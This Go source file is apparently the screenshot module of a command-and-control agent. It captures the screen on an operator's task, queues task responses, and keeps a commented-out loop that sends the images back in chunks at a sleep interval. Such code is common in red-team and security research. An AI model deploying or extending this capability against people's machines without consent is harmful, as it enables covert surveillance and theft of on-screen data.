package screencapture

import (
	"encoding/json"

	"pkg/profiles"
	"pkg/utils/structs"
	"sync"
)

var mu sync.Mutex

//ScreenShot - interface for holding screenshot data
type ScreenShot interface {
	Monitor() int
	Data() []byte
}

//Run - function used to obtain screenshots
func Run(task structs.Task, ch chan []ScreenShot) {
	result, err := getscreenshot()
	msg := structs.Response{}
	msg.TaskID = task.TaskID
	if err != nil {
		msg.UserOutput = err.Error()
		msg.Completed = true
		msg.Status = "error"

		resp, _ := json.Marshal(msg)
		mu.Lock()
		profiles.TaskResponses = append(profiles.TaskResponses, resp)
		mu.Unlock()
		return
	}

	ch <- result
	/*for i := 0; i < len(result); i++ {
		profiles.Profile.SendFileChunks(task, result[i].Data(), ch)
		time.Sleep(time.Duration(profiles.Profile.SleepInterval()) * time.Second)
	}*/

	return
}
